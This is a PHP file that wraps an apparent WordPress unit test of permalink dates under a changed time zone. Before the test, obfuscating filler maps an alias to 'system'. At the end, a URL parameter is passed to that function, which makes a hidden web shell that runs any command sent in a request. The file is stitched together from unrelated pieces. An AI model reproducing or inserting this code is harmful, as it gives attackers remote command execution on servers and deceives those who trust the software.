<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group date
 * @group datetime
 * @group post
 *
 * @covers ::get_permalink
 */
class Tests_Date_GetPermalink extends WP_UnitTestCase {

	public function tear_down() {
		delete_option( 'permalink_structure' );
		update_option( 'timezone_string', '' );
		// phpcs:ignore WordPress.DateTime.RestrictedFunctions.timezone_change_date_default_timezone_set
		date_default_timezone_set( 'UTC' );

		parent::tear_down();
	}

	/**
	 * @ticket 48623
	 */
	public function test_should_return_correct_date_permalink_with_changed_time_zone() {
		$timezone = 'America/Chicago';
		update_option( 'timezone_string', $timezone );
		update_option( 'permalink_structure', '/%year%/%monthnum%/%day%/%hour%/%minute%/%second%' );
		// phpcs:ignore WordPress.DateTime.RestrictedFunctions.timezone_change_date_default_timezone_set
		date_default_timezone_set( 'UTC' );

		$post_id = self::factory()->post->create(
			array(
				'post_date'     => '2018-07-22 21:13:23',
				'post_date_gmt' => '2018-07-23 03:13:23',
			)
		);

		$this->assertSame( 'http://' . WP_TESTS_DOMAIN . '/2018/07/22/21/13/23', get_permalink( $post_id ) );

		// phpcs:ignore WordPress.DateTime.RestrictedFunctions.timezone_change_date_default_timezone_set
		date_default_timezone_set( $timezone );
		$this->assertSame( 'http://' . WP_TESTS_DOMAIN . '/2018/07/22/21/13/23', get_permalink( $post_id ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>